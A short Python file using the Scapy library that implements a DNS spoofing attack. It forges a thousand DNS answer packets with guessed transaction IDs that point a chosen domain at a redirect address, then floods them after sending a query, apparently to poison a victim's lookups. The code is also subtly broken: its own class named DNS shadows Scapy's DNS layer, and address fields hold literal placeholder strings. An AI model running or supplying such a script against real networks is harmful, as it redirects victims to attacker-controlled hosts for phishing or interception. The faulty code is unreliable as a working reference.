from scapy.all import *
from scapy.layers.l2 import *

# IP_REDIR:  The 'fake' IP Address of the spoofed domain
# IP_REAL:      The actual IP Address of the spoofed domain
# IP_VICTIM:    The IP Address of the victim
# IP_VM:        The IP Address of the virtual machine
# DOMAIN:       The domain to be spoofed


class DNS:
    def __init__(self, DOMAIN, IP_REDIR):
        self.DOMAIN = DOMAIN
        self.IP_REDIR = IP_REDIR

    @staticmethod
    def spoof(DOMAIN, IP_REDIR):
        pkts = []
        for x in range(10000, 11000):
            pkt = Ether(src="MAC_REDIR", dst="MAC_VICTIM")/IP(dst=IP_REDIR,src="IP_VICTIM")/UDP(dport=53)/DNS(id=x,an=DNSRR(rrname=DOMAIN, type='A', rclass='IN', ttl=350, rdata=IP_REDIR))
            pkts.append(pkt)
        dns = Ether(src="MAC_REDIR", dst="MAC_VM")/IP(dst=IP_REDIR, src="IP_VM")/UDP()/DNS(qd=DNSQR(qname=DOMAIN))
        sendp(dns, verbose=0)
        for pkt in pkts:
            sendp(pkt, verbose=0)
